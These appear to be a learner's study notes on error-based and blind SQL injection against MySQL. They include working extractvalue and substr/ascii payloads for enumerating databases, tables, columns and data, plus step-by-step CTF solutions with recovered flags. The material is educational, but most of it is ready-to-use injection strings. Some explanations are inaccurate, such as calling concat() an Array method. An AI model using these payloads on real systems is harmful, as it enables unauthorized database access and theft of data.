# Error Based SQL Injection & Blind-based SQL Injection

## Part 1. Review

1. UNion SQL Injection
* Rule? = column number (order by / union select null, null .... #)
* It can make select use again
* [Union SQL Injection: How It Works and 6 Tips for Prevention](https://brightsec.com/blog/union-sql-injection/)

2. Other SQL Injections
* Error Based SQL Injection
  - An in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database.
* Blind SQL Injection
  - A type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.

3. Python Basic Logic

## Part 2. Error based SQL Injection
* Data output by using error messages

1. Syntax Error in Logic Error
```javascript
select * from member where id='
```
- Syntax error is not working for SQL Injection

2. Logic Error (Error Based SQL Injection)
- By using error messages, input the SQL Injection and make it output
- We want output on the error message
- XPATH syntax error = a syntax or language that makes finding elements on a webpage possible using XML path expression
* Logic error tip to create errors
  - It is different from databases such as MySQL, Oracle, mssql
  - The EXTRACTVALUE function takes as arguments an XMLType instance and an XPath expression and returns a scalar value of the resultant node.
```javascript
extractvalue('xml text','xml expression')
```
```javascript
normaltic' and extractvalue('1', ':normaltic') and '1'='1
```
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select'normaltic'))) and'1'='1
```
- The concat() method of Array instances is used to merge two or more arrays.
```javascript
concat('1','2')
```
  - Result  => 12
```javascript
concat(0x3a, 'test')
```
  - Result => :test
```javascript
concat(0x3a, (select 'normaltic'))
```

## Part 3. Error based SQL Injection Process
1. Find SQL Point
ex) normaltic'
2. Output function of error
extractvalue
3. Create attack format
```javascript
normaltic' and extractvalue('1', concat(0x3a,(_______________))) and '1'='1
```
4. Output of DB name
```javascript
select database()
```
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
```
5. Table name
```javascript
limit(column_number, row_number)
select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
select table_name from information_schema.tables where table_schema = 'database_name' limit 1,1
select table_name from information_schema.tables where table_schema = 'database_name' limit 2,1
normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1))) and '1'='1
```
6. Column name
```javascript
select column_name from information_schema.columns where table_name = 'table_name' limit 0,1
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'table_name' limit 0,1))) and '1'='1
```
7. Data output
```javascript
select name from game limit 0,1
normaltic' and extractvalue('1', concat(0x3a,(select name from game limit 0,1))) and '1'='1
```

* CTF - SQL Injection (Error Based SQLi Basic)
1. Find SQL Point
2. Output function of error
3. Create attack format
4. Output of DB name: errSqli
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
```
5. Table name: flagTable
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'errSqli' limit 0,1))) and '1'='1
```
6. Column name: flag
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flagTable' limit 1,1))) and '1'='1
```
7. Data output
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag from flagTable limit 0,1))) and '1'='1
```

## Part 4. Blind-based SQL Injection
* Display output of SQL injection result: Union SQL Injection
* Display error message: Error-based SQL injection
* Not display error message: Blind-based SQL injection
  - Log-in page
  - ID double check
  - Response difference between True or False
* ID exists
```javascript
normaltic' and '1' = '1            
```
* ID doesn't exist
```javascript
normaltic' and '1' = '2
```
```javascript
normaltic' and ('1' = '1') and '1' = '1
```

## Part 5. Blind-based SQL Injection Process
1. Find SQL Injection Point
* True
```javascript
normaltic' and '1'='1
```
* False
```javascript
normaltic' and '1'='2
```
2. Check select function
```javascript
normaltic' and ((select'test')='test')) and '1'='1
```
3. Attack format
* substr() = The SUBSTR() function extracts a substring from a string (starting at any position)
```javascript
normaltic' and (_____________) and '1'='1
substr('test',1,1) => 't'
substr('test',1,2) => 'te'
substr('test',2,1) => 'e'
substr((___SQL___),1,1)
substr((select'test'),1,1)='t'
normaltic' and (substr((select'test'),1,1)='t') and '1'='1
ascii(substr((___SQL___),1,1)) > 0
```
* Attack format = When operating the attack format, it executes the repeater in Burp suite
```javascript
normaltic' and (ascii(substr((select'test'),1,1)) > 0) and '1'='1
```
4. Find database
```javascript
normaltic' and (ascii(substr((select database()),1,1)) > 0) and '1'='1     = Attack format
```
5. Find table name
```javascript
select table_name from information_schema.tables where table_schema = 'database_name' limit 0,1
```
6. Find column name
```javascript
select column_name from information_schema.columns where table_name = 'flagTable_this' limit 0,1
```
7. Find data
```javascript
select flag from flagTable_this limit 0,1
```

## Part 6. Assignment
1. Review Error-base SQL Injection
2. Review Blind-based SQL Injection
3. CTF - SQL Injection (Blind Practice)
* database      => blindSqli
* table_name      => plusFlag_Table
* coulum_name      => flag
4. Review SQL Injection
5. SQL Injection - CTF
6. Web Site Development

* CTF - SQL Injection 3
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
```
Result => sqli_2
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'sqli_2' limit 0,1))) and '1'='1
```
Result => flag_table
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 0,1))) and '1'='1
```
Result => flag
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag from flag_table limit 0,1))) and '1'='1
```

* CTF - SQL Injection 4
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select database()))) and '1'='1
```
Result => sqli_2_1
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select table_name from information_schema.tables where table_schema = 'sqli_2_1' limit 0,1))) and '1'='1
```
Result => flag_table
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 0,1))) and '1'='1
```
Result => flag1
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 1,1))) and '1'='1
```
Result => flag2
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 2,1))) and '1'='1
```
Result => flag3
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 3,1))) and '1'='1
```
Result => flag4
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 4,1))) and '1'='1
```
Result => flag5
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 5,1))) and '1'='1
```
Result => flag6
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 6,1))) and '1'='1
```
Result => flag7
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select column_name from information_schema.columns where table_name = 'flag_table' limit 7,1))) and '1'='1
```
Result => flag8
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag1 from flag_table limit 0,1))) and '1'='1
```
Result => segfault{1
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag2 from flag_table limit 0,1))) and '1'='1
```
Result => you_
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag3 from flag_table limit 0,1))) and '1'='1
```
Result => must_
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag4 from flag_table limit 0,1))) and '1'='1
```
Result => concat_
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag5 from flag_table limit 0,1))) and '1'='1
```
Result => this_
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag6 from flag_table limit 0,1))) and '1'='1
```
Result => string_
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag7 from flag_table limit 0,1))) and '1'='1
```
Result => good
```javascript
normaltic' and extractvalue('1', concat(0x3a,(select flag8 from flag_table limit 0,1))) and '1'='1
```
Result => job}

* CTF - SQL Injection 5
1. database()    => sqli_2_2
2. table_name    => flagTable_this
3. columns_name    => flag
4. data      => 13

* CTF - SQL Injection 6
1. database()    => sqli_3
2. table_name      => flag_table
3. columns_name      => flag
